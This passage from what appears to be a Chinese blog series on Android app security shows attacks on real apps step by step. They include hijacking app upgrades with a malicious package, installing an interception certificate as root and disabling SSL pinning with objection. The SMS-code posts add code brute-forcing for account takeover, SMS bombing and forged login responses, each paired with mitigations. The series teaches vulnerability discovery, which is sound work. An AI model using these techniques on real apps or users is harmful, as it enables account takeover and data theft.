class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">我们可以发现响应的结果中包含hash值，下载的链接，我们只需要将此响应的hash值替换成我们恶意应用的hash值，然后将下载的url劫持为我们本地的即可</span><br></pre></td></tr></table></figure>\n\n<p><strong>（2）劫持升级</strong></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/11.png\" alt=\"avatar\"></p>\n<p>我们用文件服务器模拟该url：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/12.png\" alt=\"avatar\"></p>\n<p>我们将主机的域名解析更改为我们本地的ip：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/13.png\" alt=\"avatar\"></p>\n<p>我们查取我们恶意程序的hash值：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/14.png\" alt=\"avatar\"></p>\n<p>我们劫持更新响应的url：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/15.png\" alt=\"avatar\"></p>\n<p>开始升级替换：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/16.png\" alt=\"avatar\"></p>\n<p>我们成功替换hash值，并点击升级：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/17.png\" alt=\"avatar\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/18.png\" alt=\"avatar\"></p>\n<h3 id=\"3-https-hash验证升级劫持——以学而思网课为例（CVND-2021-169938）\"><a href=\"#3-https-hash验证升级劫持——以学而思网课为例（CVND-2021-169938）\" class=\"headerlink\" title=\"3. https+hash验证升级劫持——以学而思网课为例（CVND-2021-169938）\"></a>3. https+hash验证升级劫持——以学而思网课为例（CVND-2021-169938）</h3><p><strong>（1）配置stunnel，实现https下载</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">由于我们的HFS文件服务器只能支持http访问，但是对于当下市面上大多是https传输，所以我们可以结合stunnel+HFS实现https访问下载</span><br></pre></td></tr></table></figure>\n\n<p>stunnel配置：详细见<a href=\"https://bbs.pediy.com/thread-268459.htm\">stunnel配置</a></p>\n<p><strong>（2）我们劫持请求报文</strong></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/19.png\" alt=\"avatar\"></p>\n<p>我们将响应的报文保存下来，并修改其对应的MD5值</p>\n<p><strong>（3） 我们用HFS模拟下载的URL链接</strong></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/20.png\" alt=\"avatar\"></p>\n<p><strong>（4） 由于是采用https传输，我们需要借助工具stunnel，才能实现https传输</strong></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/21.png\" alt=\"avatar\"></p>\n<p>我们配置好后，就可以https访问了</p>\n<p><strong>（5）我们进行截获</strong></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/22.png\" alt=\"avatar\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0016/23.png\" alt=\"avatar\"></p>\n<p>​\t\t重新启动，我们发现可以升级截获成功</p>\n<h2 id=\"四、实验总结\"><a href=\"#四、实验总结\" class=\"headerlink\" title=\"四、实验总结\"></a>四、实验总结</h2><p>我们总结了当下APP升级劫持攻击的常见形式，并分别对三种不同形式的升级劫持攻击做了一个具体的案例描述，可以发现都是通过抓包劫持替换实现的，恶意攻击者可以在用户手机中安装证书，就可以使用http&#x2F;https中间人攻击，来劫持升级报文。我们可以发现当下大部分主流的APP都存在这种漏洞，并以此对提交的三个漏洞做了一个讲解，对于一些其他的APP，通常采用加密算法加密，这样获取报文的情况较难。</p>\n","categories":["Android APP漏洞之战"],"tags":["漏洞挖掘","工具"]},{"title":"Android App漏洞之战（17）——验证码漏洞挖掘详解","url":"/2023/02/14/bug0017/","content":"<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>验证码漏洞也是当下十分常见的APP端漏洞，本文对验证码漏洞原理做了一个初步的讲解，并复现了当下一些常见的验证码相关的漏洞，本文App抓包技术参考了肉丝大佬的书籍安卓Frida逆向和抓包实战</p>\n<span id=\"more\"></span>\n<p>本文第二节主要讲述Android APP端抓包的基础知识</p>\n<p>本文第三节主要讲述APP验证码漏洞的种类和安全场景</p>\n<p>本文第四节主要讲述APP验证码原理，并复现了一些常见的验证码相关漏洞</p>\n<h2 id=\"二、基础知识\"><a href=\"#二、基础知识\" class=\"headerlink\" title=\"二、基础知识\"></a>二、基础知识</h2><p>APP验证码漏洞挖掘，需要掌握基本的Android抓包技术，现在越来越多的APP开始进行安全防护，所以如何才能绕过一些基本的防护技术，合理的抓取到报文是验证码漏洞挖掘的先决条件。学习下面知识之前，可以先学习<a href=\"https://bbs.pediy.com/thread-270634.htm\">Android APP漏洞之战（6）——HTTP&#x2F;HTTPs通信漏洞详解</a>的基础理论知识。</p>\n<h3 id=\"1-APP抓包技术详解\"><a href=\"#1-APP抓包技术详解\" class=\"headerlink\" title=\"1.APP抓包技术详解\"></a>1.APP抓包技术详解</h3><h4 id=\"（1）高版本android系统证书导入\"><a href=\"#（1）高版本android系统证书导入\" class=\"headerlink\" title=\"（1）高版本android系统证书导入\"></a>（1）高版本android系统证书导入</h4><p><strong>Android4.4后</strong></p>\n<p>开始引入CA证书校验机制，这里先会涉及到Https的单向认证机制</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/1.png\"></p>\n<p>上述步骤4就进行证书校验的环节，而这里的证书便是将手机内置的证书和客户端的证书进行校验，来判断是否合法</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Https原理：非对称+对称连接</span><br><span class=\"line\">\t（1）非对称主要是为了传输对称连接所需要密钥和证书校验</span><br><span class=\"line\">\t（2）对称连接是加密密码可以安全传输，就可以采用对称连接</span><br></pre></td></tr></table></figure>\n\n<p><strong>Android4.4-Android7.0</strong></p>\n<p>这个阶段，Android系统信任用户下的证书，所以逆向人员可以将抓包工具的证书导入用户目录下，实现对Https的报文抓取，这里案例可以参考<a href=\"https://bbs.pediy.com/thread-268445.htm\">Android协议分析（一）——Fiddler安装和使用 </a></p>\n<p><strong>Android7.0+</strong></p>\n<p>Android7.0后，Android系统不再信任用户目录下证书，只信任根目录下证书，所以我们要获取HTTPs报文，需要将抓包工具的证书移动到根目录下</p>\n<p>方法一：将文件系统先挂载起来，然后移动</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">root权限下：</span><br><span class=\"line\">mount -o remount,rw /system</span><br><span class=\"line\">cp * /etc/security/cacerts/</span><br><span class=\"line\">chmod <span class=\"number\">777</span> /etc/security/cacerts<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">mount -o remount,ro /system</span></span><br><span class=\"line\"><span class=\"comment\">reboot</span></span><br></pre></td></tr></table></figure>\n\n<p>方法二：使用Magisk证书模块</p>\n<p><a href=\"https://github.com/Magisk-Modules-Repo/movecert\">Move Certificates</a></p>\n<p>我们只需要将模块安装到Magisk中，这样就可以成功的抓取常规状态下的HTTPs的报文了，这里一定主要抓包时必须保证Android手机时间要正确，否则也会报错</p>\n<h4 id=\"（2）HTTPs双向认证及解决方案\"><a href=\"#（2）HTTPs双向认证及解决方案\" class=\"headerlink\" title=\"（2）HTTPs双向认证及解决方案\"></a>（2）HTTPs双向认证及解决方案</h4><p>Https一般采用单向认证，但是一些特殊的APP在服务端也会对证书进行再次认证，这样的认证机制我们称为HTTPs双向认证</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/2.png\"></p>\n<p>上图中步骤5就对客户端证书进行了校验，这里导致我们就算客户端导入了抓包工具的证书并信任，也无法通过服务端的认证</p>\n<p><strong>解决办法：</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）获取客户端的证书，可以通过编写hook脚本的方式，获取客户端证书及密码</span><br><span class=\"line\">（2）将客户端证书导入到抓包软件charles中，使得Charles能都获取服务端信任（这里一般可以使用charles、Burpsuit软件）</span><br></pre></td></tr></table></figure>\n\n<p>方法一：</p>\n<p>这里我们一般可以先去分析开发中进行保护的函数，再对对应的函数进行hook</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">例如java.security.KeyStore</span><br></pre></td></tr></table></figure>\n\n<p>这里可以参考肉丝大佬的文章<a href=\"https://www.anquanke.com/post/id/197657#h3-11\">实用FRIDA进阶：内存漫游、hook anywhere、抓包</a></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/3.png\"></p>\n<p>这里考虑篇幅问题，给一个参考的实操案例<a href=\"https://ch3nye.top/%E3%80%90%E5%AE%9E%E6%88%98%E3%80%91%E6%9F%90%E4%BA%A4%E5%8F%8Bapp%E7%9A%84%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81crack/\">某交友app的双向认证crack</a></p>\n<p>方法二：</p>\n<p>直接在Apk文件下搜索.p12后缀的文件，这里搜索出来的很有可能就是证书文件，当然有些需要密码的就还是要进行hook了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">tree -NCfhl |grep -i p12</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/4.png\" alt=\"image-20220409205835643\"></p>\n<h4 id=\"（3）VPN代理机制\"><a href=\"#（3）VPN代理机制\" class=\"headerlink\" title=\"（3）VPN代理机制\"></a>（3）VPN代理机制</h4><p>如果APP中编写了检测代理抓包软件代码，也可能会导致我们抓不到包</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">System.getProperty(“http.proxyHost”); </span><br><span class=\"line\">System.getProperty(“http.proxyPort”); </span><br></pre></td></tr></table></figure>\n\n<p>这样我们使用代理软件进行抓包要更加合适，当然也有一些检测VPN的情况，这种直接hook就可以了</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/5.png\" alt=\"image-20220410094013590\"></p>\n<p>具体如何配置使用，可以参考这篇文章<a href=\"https://mp.weixin.qq.com/s/ahPbBSfkkBsv4oy265rI2Q\">APP流量 “一个都不能少” ！</a></p>\n<p>采用VPN代理进行抓包，和Http中间人抓包有本质区别，VPN抓包本质在网络层和路由层抓包</p>\n<h4 id=\"（4）SSL-pinning\"><a href=\"#（4）SSL-pinning\" class=\"headerlink\" title=\"（4）SSL pinning\"></a>（4）SSL pinning</h4><p>就算我们使用Vpn代理抓包，也解决了证书双向认证的问题，但是在抓包过程中也可能会遇到证书绑定的情况</p>\n<p>证书绑定：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">APP在代码段中有有对服务端证书进行对比一致性，如果发现是中间人就会直接终止连接</span><br></pre></td></tr></table></figure>\n\n<p>这里我们提供一般的解决思路：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）识别证书绑定</span><br><span class=\"line\">（2）先使用开源框架objection或DroidSSLUnpinning先去简单hook</span><br><span class=\"line\">（3）不成功，再去分析APP使用哪种开发框架，去有针对性的进行hook</span><br><span class=\"line\">（4）如果不知道开发框架，可以采用Hook Java的File构造函数进一步去定位证书绑定代码</span><br></pre></td></tr></table></figure>\n\n<p>这里用一个简单的实例来说明：</p>\n<p><strong>识别证书绑定：</strong></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/6.png\" alt=\"image-20220410095914907\"></p>\n<p>当我们解决了单向认证、双向认证、采用代理通信还出现上面的情况，说明APP可能采用了证书绑定</p>\n<p><strong>使用开源框架hook——以objection为例：</strong></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/7.png\" alt=\"image-20220410095914907\"></p>\n<p>我们直接使用objection的hook或spwan模式就进行证书绑定hook</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">hook模式启动：android sslpinning disable</span><br><span class=\"line\">spwan模式启动：objection -g 包名 explore -s &quot;android sslpinning disable&quot;</span><br></pre></td></tr></table></figure>\n\n<p><strong>针对开发框架，有针对性hook:</strong></p>\n<p>我们需要分析APP采用何种开源框架，如okhttp等，不过这里一般开源hook工具objection已经针对了当下的很多开源框架了，所以如果没有成功，可能是程序进行了混淆，这个时候就需要进一步去hook正确的绑定函数</p>\n<p><strong>未知开源框架：</strong></p>\n<p>我们对File构造函数进行hook，然后可以观察对应的调用链信息，从而分析出证书绑定的函数</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/8.png\" alt=\"image-20220410095914907\"></p>\n<p>再针对这里找到的函数进行正确的hook，即可</p>\n<h4 id=\"（5）VPN-Charles-Burpsuit环境配置\"><a href=\"#（5）VPN-Charles-Burpsuit环境配置\" class=\"headerlink\" title=\"（5）VPN+Charles+Burpsuit环境配置\"></a>（5）VPN+Charles+Burpsuit环境配置</h4><p>我们经过上面一系列流程基本可以解决当下常见的安全防护形式，当然针对更加安全的抓包防护策略就需要深入的解决了，这里我们介绍一下本文的抓包环境搭建，一般使用通过VPN+Charles+Burpsuit的组合抓包方式</p>\n<p>首先先配置VPN+Charles的抓包模式</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/9.png\" alt=\"image-20220410101546946\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/10.png\" alt=\"image-20220410101609229\"></p>\n<p>然后我们将Charles的流量去导入到Burpsuit中，这样就可以实现组合使用，当然根据实际情况你也可以选择合适抓包工具</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/11.png\" alt=\"image-20220410102252123\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/12.png\" alt=\"image-20220410102431749\"></p>\n<h2 id=\"三、验证码漏洞安全场景和分类\"><a href=\"#三、验证码漏洞安全场景和分类\" class=\"headerlink\" title=\"三、验证码漏洞安全场景和分类\"></a>三、验证码漏洞安全场景和分类</h2><h3 id=\"1-验证码漏洞安全场景\"><a href=\"#1-验证码漏洞安全场景\" class=\"headerlink\" title=\"1.验证码漏洞安全场景\"></a>1.验证码漏洞安全场景</h3><p>验证码漏洞一般是APP对验证码没有进行登陆校验等安全防护导致的，攻击者一般可以利用验证码漏洞进行暴力破解实现任意号码登陆、还可以实现短信轰炸、导致验证码泄露、手机号换绑、验证码无限发送风险、万能验证码登录、修改返回包绕过验证码登录等安全问题，验证码漏洞在APP中的影响十分严重，一般会造成严重的经济损失。</p>\n<h3 id=\"2-验证码漏洞分类\"><a href=\"#2-验证码漏洞分类\" class=\"headerlink\" title=\"2.验证码漏洞分类\"></a>2.验证码漏洞分类</h3><p>我们根据上面的描述，可以将验证码漏洞分为如下几类：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/45.png\" alt=\"image-20220411111532796\"></p>\n<h2 id=\"四、验证码漏洞原理分析和复现\"><a href=\"#四、验证码漏洞原理分析和复现\" class=\"headerlink\" title=\"四、验证码漏洞原理分析和复现\"></a>四、验证码漏洞原理分析和复现</h2><h3 id=\"1-验证码暴力破解漏洞\"><a href=\"#1-验证码暴力破解漏洞\" class=\"headerlink\" title=\"1.验证码暴力破解漏洞\"></a>1.验证码暴力破解漏洞</h3><h4 id=\"（1）原理分析\"><a href=\"#（1）原理分析\" class=\"headerlink\" title=\"（1）原理分析\"></a>（1）原理分析</h4><p>验证码暴力破解漏洞一般是因为用户使用手机号+验证码的方式进行登陆时，短信验证码一般由4-6位数字组成，而且APP并未对验证码做时间和失败次数校验，所以攻击者可以通过这个区间的所有数字进行暴力破解来进行攻击</p>\n<h4 id=\"（2）漏洞复现\"><a href=\"#（2）漏洞复现\" class=\"headerlink\" title=\"（2）漏洞复现\"></a>（2）漏洞复现</h4><p>案例：XX APP为例</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/14.png\" alt=\"image-20220410105515919\"></p>\n<p>我们打开APP，发现该APP并未对登录号码进行验证，而且返回的验证码是4位验证码，这里我们就十分怀疑是否能进行验证码暴力破解</p>\n<p>然后我们使用上面搭建好的抓包环境，随便输入一个验证码去抓取错误信息</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/15.png\" alt=\"image-20220410105515919\"></p>\n<p>我们发现APP根本没有进行证书绑定等安全防护，甚至没对验证码进行加密，我们于是对响应的报文进行攻击</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/16.png\" alt=\"image-20220410105515919\"></p>\n<p>然后我们采用100个线程，就暴力破解</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/17.png\" alt=\"image-20220410105515919\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/18.png\" alt=\"image-20220410105515919\"></p>\n<p>开始攻击</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/19.png\" alt=\"image-20220410105515919\"></p>\n<p>然后我们就成功暴力破解出验证码，这里我们发现还可以输入任意的号码<code>18888888888</code>同样可以成功登录，而且可以获取其他用户的订单信息</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/20.png\" alt=\"image-20220410110251127\"></p>\n<p>最后类似漏洞危害，如下</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/21.png\" alt=\"image-20220410110705360\"></p>\n<h4 id=\"（3）安全防护\"><a href=\"#（3）安全防护\" class=\"headerlink\" title=\"（3）安全防护\"></a>（3）安全防护</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）设置验证码时间验证，一般建议为180s</span><br><span class=\"line\">（2）限制单位时间内验证码失败的尝试错误，如5分钟连续失败即锁定账号</span><br><span class=\"line\">（3）对验证码进行加密传输</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-验证码无限次数发送（短信轰炸）\"><a href=\"#2-验证码无限次数发送（短信轰炸）\" class=\"headerlink\" title=\"2.验证码无限次数发送（短信轰炸）\"></a>2.验证码无限次数发送（短信轰炸）</h3><h4 id=\"（1）原理分析-1\"><a href=\"#（1）原理分析-1\" class=\"headerlink\" title=\"（1）原理分析\"></a>（1）原理分析</h4><p>验证码无限次数发送、短信轰炸漏洞一般是APP端并没有对手机号码进行次数显示，也未对访问进行时间限制</p>\n<h4 id=\"（2）漏洞复现-1\"><a href=\"#（2）漏洞复现-1\" class=\"headerlink\" title=\"（2）漏洞复现\"></a>（2）漏洞复现</h4><p>我们首先对上面的APP进行发送验证码，查看响应的报文</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/22.png\" alt=\"image-20220410111915010\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/26.png\" alt=\"image-20220411101714278\"></p>\n<p>然后通过暴力破解进行短信轰炸，这里轰炸自己手机号，就轰炸个50次吧</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/24.png\" alt=\"image-20220410112221486\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/25.png\" alt=\"image-20220410112415310\"></p>\n<p>我们发现可以验证码无限次数发送，但是无法进行短信轰炸，因为验证码做了60s校验，于是尝试去分析APP代码</p>\n<p>我们将APP拖入GDA分析</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/27.png\" alt=\"image-20220411102019374\"></p>\n<p>这里我们发现APP进行360加固保护，我们就使用一代壳脱壳工具Frida_Dump进行脱壳</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/28.png\" alt=\"image-20220411102212716\"></p>\n<p>我们定位到相关的代码段:</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/29.png\" alt=\"image-20220411102327963\"></p>\n<p>分析了代码逻辑，本来以为可以简单的hook相关的函数，使得验证码60s时间变少，但是发现成功发送后还是显示需要60s后再次发送，这说明这个验证就是根据发送的报文，在服务端进行校验</p>\n<p>我们查看发送的报文：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/30.png\" alt=\"image-20220411104546386\"></p>\n<p>我们发现获取验证码就是对应的手机号和time值，很显然我们推测time值是用来校验时间和对应手机号的</p>\n<p>我们分析对应源码：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/31.png\" alt=\"image-20220411104714014\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/32.png\" alt=\"image-20220411104815174\"></p>\n<p>我们可以清晰发现为什么APP验证码对当前系统时间进行校验，因为有系统时间获取函数</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/33.png\" alt=\"image-20220411104901496\"></p>\n<p>同理，我们可以发现验证码校验的一些段落，包括四位验证码等</p>\n<p>最后经过分析，得出就是服务端会对每次发送的手机号和系统时间和手机号编码产生的密钥进行校验，会对60s时间进行校验，以及会对当前手机系统时间进行校验</p>\n<p>这里我们可以简单进行60s间隔的短信轰炸，可以简单实现效果如下：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/34.png\" alt=\"image-20220411105257847\"></p>\n<p>因为现在短信轰炸漏洞越来越少，这里没找到更加合适的案例，这里收集一个大佬写的短信漏洞轰炸的文章，可以参考下：<a href=\"https://www.anquanke.com/post/id/93878\">挖洞技巧：绕过短信&amp;邮箱轰炸限制以及后续</a></p>\n<h4 id=\"（3）安全防护-1\"><a href=\"#（3）安全防护-1\" class=\"headerlink\" title=\"（3）安全防护\"></a>（3）安全防护</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">(1)增加验证码发送校验时间间隔</span><br><span class=\"line\">(2)采用代理池对ip进行限制</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-验证码泄露风险与万能验证码漏洞\"><a href=\"#3-验证码泄露风险与万能验证码漏洞\" class=\"headerlink\" title=\"3.验证码泄露风险与万能验证码漏洞\"></a>3.验证码泄露风险与万能验证码漏洞</h3><h4 id=\"（1）原理分析-2\"><a href=\"#（1）原理分析-2\" class=\"headerlink\" title=\"（1）原理分析\"></a>（1）原理分析</h4><p>验证码执行【找回密码】操作时，输入手机号，获取验证码，服务器会向手机发送验证码，通过burpsuite抓包工具，查看返回的响应数据包中如果包含验证码，则可能导致用户密码恶意重置、绑定手机号被恶意更换等风险</p>\n<p>万能验证码一般是开发在业务未上线的时候为了方便测试用的,上线后忘记删除了,例如[8888 0000 1234](tel:8888 0000 1234)等等</p>\n<h4 id=\"（2）安全防护\"><a href=\"#（2）安全防护\" class=\"headerlink\" title=\"（2）安全防护\"></a>（2）安全防护</h4><p>因为当下这种漏洞较少，这里没有找到合适案例，就只简单介绍下原理了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）禁止验证码在本地客户端生成，应采用服务器端验证码生成机制；</span><br><span class=\"line\">（2）设置验证码的时效性，如180秒过期；</span><br><span class=\"line\">（3）验证码应随机生成，且使用一次即失效。</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-修改返回包绕过登录漏洞\"><a href=\"#4-修改返回包绕过登录漏洞\" class=\"headerlink\" title=\"4.修改返回包绕过登录漏洞\"></a>4.修改返回包绕过登录漏洞</h3><h4 id=\"（1）原理分析-3\"><a href=\"#（1）原理分析-3\" class=\"headerlink\" title=\"（1）原理分析\"></a>（1）原理分析</h4><p>在APP验证码测试过程中，我们发现很对APP并未对登录成功的响应报文进行校验，导致我们获取登录成功的响应报文后，就可以通过正确的响应报文实现任意号码的登录，导致信息泄露</p>\n<h4 id=\"（2）漏洞复现-2\"><a href=\"#（2）漏洞复现-2\" class=\"headerlink\" title=\"（2）漏洞复现\"></a>（2）漏洞复现</h4><p>案例：XXAPP</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/35.png\" alt=\"image-20220411110615223\"></p>\n<p>我们先使用手机号进行正确的登录，同时我们使用burpsuit抓取正确登录的响应信息</p>\n<p><strong>发送的请求：</strong></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/36.png\" alt=\"image-20220411110709567\"></p>\n<p><strong>响应的报文：</strong></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/37.png\" alt=\"image-20220411110756668\"></p>\n<p>此时我们可以获取正确响应的报文，我们只需要对在下次登录时对该响应请求进行替换即可</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/38.png\" alt=\"image-20220411110840086\"></p>\n<p>此时我们再次登录，这里我们随便输入验证码5555</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/39.png\" alt=\"image-20220411110840086\"></p>\n<p>然后我们注意设置对响应进行抓取</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/40.png\" alt=\"image-20220411111006306\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/41.png\" alt=\"image-20220411111006306\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/42.png\" alt=\"image-20220411111055714\"></p>\n<p>然后进行替换</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/43.png\" alt=\"image-20220411111136053\"></p>\n<p>最后我们替换报文发现成功登录：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0017/44.png\" alt=\"image-20220411111203716\"></p>\n<h4 id=\"（3）安全防护-2\"><a href=\"#（3）安全防护-2\" class=\"headerlink\" title=\"（3）安全防护\"></a>（3）安全防护</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">不要在前端利用服务端返回的值判断是否可以修改密码 要把整个效验环节交给服务端</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"五、实验总结\"><a href=\"#五、实验总结\" class=\"headerlink\" title=\"五、实验总结\"></a>五、实验总结</h2><p>本文详细的介绍了APP中的抓包技术，以及讲述了当下APP端验证码漏洞挖掘实现的一些常见的方式，验证码漏洞还有更多的漏洞，后续会进一步完善，本文拿了一些实例具体复现了漏洞的挖掘步骤，并提交CNVD获得了一些中高危漏洞，一些更详细资料放在github和星球中</p>\n<p>github首页：<a href=\"https://github.com/guoxuaa\">github</a></p>\n<h2 id=\"六、参考文献\"><a href=\"#六、参考文献\" class=\"headerlink\" title=\"六、参考文献\"></a>六、参考文献</h2><p>参考书籍：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">安卓Frida逆向与抓包实战</span><br></pre></td></tr></table></figure>\n\n<p>验证码漏洞：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://www.52pojie.cn/thread-1613856-1-1.html</span><br><span class=\"line\">https://www.jianshu.com/p/d2b4c6a54d68</span><br><span class=\"line\">https://www.bilibili.com/read/cv4218190</span><br></pre></td></tr></table></figure>\n\n<p>短信轰炸漏洞：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://www.anquanke.com/post/id/93878</span><br><span class=\"line\">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=27614</span><br></pre></td></tr></table></figure>\n\n","categories":["Android APP漏洞之战"],"tags":["漏洞挖掘","工具"]},{"title":"Android App漏洞之战（19）——插件化漏洞与解压缩漏洞详解","url":"/2023/02/14/bug0019/","content":"<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>最近一直处于忙碌的状态，花了很长一段时间，抽出碎片时间才将这篇帖子写完，本文结合上文的动态加载文章一起学习，本文主要讲述Android中存在的插件化漏洞、签名机制漏洞、解压缩漏洞等，并对一些经典的漏洞进行了复现，本文的相关实验文件由于太多，后面都会上传到知识星球</p>\n<span id=\"more\"></span>\n<p>本文第二节主要讲述Dex文件结构、Zip文件结构、Android签名机制</p>\n<p>本文第三节主要讲述插件化漏洞和解压缩漏洞的安全场景</p>\n<p>本文第四节主要对插件化漏洞进行讲述</p>\n<p>本文第五节主要对解压缩漏洞进行讲述</p>\n<p>本文第六节主要对Janus漏洞原理进行讲述</p>\n<h2 id=\"二、基础知识\"><a href=\"#二、基础知识\" class=\"headerlink\" title=\"二、基础知识\"></a>二、基础知识</h2><h3 id=\"1-Dex文件基本结构\"><a href=\"#1-Dex文件基本结构\" class=\"headerlink\" title=\"1.Dex文件基本结构\"></a>1.Dex文件基本结构</h3><p>dex文件是anroid虚拟机Dalik运行的一种文件，包含应用程序的全部操作指令以及运行时数据，下面我们看下.class文件和.dex文件的区别：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0019/2.png\"></p>\n<p>我们可以发现dex文件将原来每个文件都有的共有信息合成一体，从而减少了class的冗余</p>\n<p>下面我们进一步详细看dex文件结构</p>\n<p><img 